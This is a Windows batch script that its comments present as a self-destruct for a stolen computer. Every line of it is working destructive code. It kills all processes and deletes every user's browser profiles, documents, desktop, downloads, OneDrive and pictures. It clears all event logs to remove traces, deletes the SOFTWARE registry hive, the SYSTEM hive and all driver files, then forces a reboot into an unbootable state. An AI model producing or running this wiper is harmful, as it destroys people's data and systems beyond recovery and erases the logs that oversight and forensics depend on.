@echo off
:: 1. Force kill all user-level processes to unlock files
echo Unlocking files...
taskkill /F /FI "STATUS eq RUNNING" /T

:: 2. Wipe Sensitive Data First (The most important part)
echo Deleting sensitive user data...
for /d %%u in (C:\Users\*) do (
    if not "%%u"=="C:\Users\Public" (
        :: Wipe browser profiles (Passwords/Cookies)
        del /s /q /f "%%u\AppData\Local\Google\Chrome\User Data\*.*"
        del /s /q /f "%%u\AppData\Local\Microsoft\Edge\User Data\*.*"
        :: Wipe personal files
        del /s /q /f "%%u\Documents\*.*"
        del /s /q /f "%%u\Desktop\*.*"
        del /s /q /f "%%u\Downloads\*.*"
        del /s /q /f "%%u\OneDrive\*.*"
        del /s /q /f "%%u\Pictures\*.*"
    )
)

:: 3. Clear Event Logs (Do this while the OS is still sane)
echo Clearing traces...
for /F "tokens=*" %%G in ('wevtutil el') do (wevtutil cl "%%G")

:: 4. Corrupt Registry (Hardware/Software config)
echo Destabilizing system...
reg delete HKLM\SOFTWARE /f
:: Note: We save HKLM\SYSTEM for the very last second so the shutdown command works.

:: 5. Attempt Native Reset or Immediate Crash
:: Using 'systemreset' is the cleanest wipe, but if it's stolen, 
:: we want to ensure it doesn't boot again.
echo Finalizing...
del /f /q C:\Windows\System32\drivers\*.sys
del /f /q C:\Windows\System32\config\SYSTEM

:: 6. Force immediate Reboot into a broken state
shutdown /r /f /t 05
